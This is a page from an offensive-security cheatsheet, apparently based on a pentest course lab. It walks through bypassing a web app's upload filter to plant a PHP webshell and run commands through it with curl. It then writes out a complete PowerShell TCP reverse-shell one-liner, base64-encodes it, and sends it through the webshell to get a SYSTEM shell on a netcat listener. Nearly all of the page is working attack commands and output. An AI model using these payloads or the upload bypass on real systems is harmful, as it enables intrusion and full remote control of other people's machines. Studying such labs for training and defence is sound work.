# Using Executable Files

Updated "Mountain Desserts" Web Application
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Using-Executable-Files-14.png)

Create a test text file
>``` shell
>kali@kali:~$ echo "this is a test" > test.txt
>```

Successful Upload of test.txt
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Using-Executable-Files-15.png)

Failed Upload of simple-backdoor.php
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Using-Executable-Files-16.png)

Successful Upload of simple-backdoor.php
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Using-Executable-Files-17.png)

Execution of dir command in the uploaded webshell
>``` shell
>kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
>
># ========== Expected Result ==========
>...
> Directory of C:\xampp\htdocs\meteor\uploads
>
>04/04/2022  06:23 AM    <DIR>          .
>04/04/2022  06:23 AM    <DIR>          ..
>04/04/2022  06:21 AM               328 simple-backdoor.pHP
>04/04/2022  06:03 AM                15 test.txt
>               2 File(s)            343 bytes
>               2 Dir(s)  15,410,925,568 bytes free
>...
># =====================================

Starting Netcat listener on port 4444
>``` shell
>kali@kali:~$ nc -nvlp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
># =====================================
>```

Encoding the oneliner in PowerShell on Linux
>``` shell
>kali@kali:~$ pwsh
>
># ========== Expected Result ==========
>PowerShell 7.1.3
>Copyright (c) Microsoft Corporation.
>
>https://aka.ms/powershell
>Type 'help' to get help.
># =====================================
>
>PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
>
>PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
>
>PS> $EncodedText =[Convert]::ToBase64String($Bytes)
>
>PS> $EncodedText
>
># ========== Expected Result ==========
>JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
>...
>AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
># =====================================
>
>PS> exit
>```

Using curl to send the base64 encoded reverse shell oneliner
>``` shell
>kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
>...
>AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
>```

Using curl to send the base64 encoded reverse shell oneliner
>``` shell
>kali@kali:~$ nc -nvlp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
>connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50603
>ipconfig
>
>Windows IP Configuration
>
>
>Ethernet adapter Ethernet0 2:
>
>   Connection-specific DNS Suffix  . : 
>   IPv4 Address. . . . . . . . . . . : 192.168.50.189
>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
>   Default Gateway . . . . . . . . . : 192.168.50.254
># =====================================
>
>PS C:\xampp\htdocs\meteor\uploads> whoami
>
>># ========== Expected Result ==========
>nt authority\system
># =====================================
>```



